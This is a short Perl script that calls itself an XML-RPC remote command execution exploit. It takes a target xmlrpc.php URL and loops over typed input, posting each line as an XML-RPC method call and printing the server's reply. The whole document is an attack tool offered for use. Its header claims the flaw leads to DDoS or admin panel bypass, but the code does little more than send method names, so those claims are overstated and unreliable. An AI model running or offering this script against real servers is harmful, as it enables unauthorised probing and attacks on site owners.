#!/usr/bin/perl -w
# *****************************************************************
# XML-RPC Remote Command Execution By Tibin Sunny 
# *****************************************************************
# If XMLRPC.php is enabled in Your server it can cause 
# the Execution of remote codes which leads to DDOS/Admin panel Bypass
#---------------------------------------------------------------------
 
use LWP::UserAgent;
 
$brws = new LWP::UserAgent;
$brws->agent("Internet Explorer 6.0");
 
$host = $ARGV[0]; 
 
if ( !$host ) 
{ 
    die("Usage: xmlrpc.pl http://site/xmlrpc.php"); 
}
 
while ( $host ) 
{
 
    print "xmlrpc\@\#";
     
    $exec = <STDIN>;  
    $data = "<methodCall><methodName>$exec</methodName><params></params></methodCall>";
     
    $send = new HTTP::Request POST => $host;
    $send->content($data);
    $gots = $brws->request($send);   
    $show = $gots->content;
     
    if ( $show =~ /<b>([\d]{1,10})<\/b><br \/>(.*)/is )
    {
        print $2 . "\n";
    }
    else
    {
        print "$show\n";
    }
 
 
}
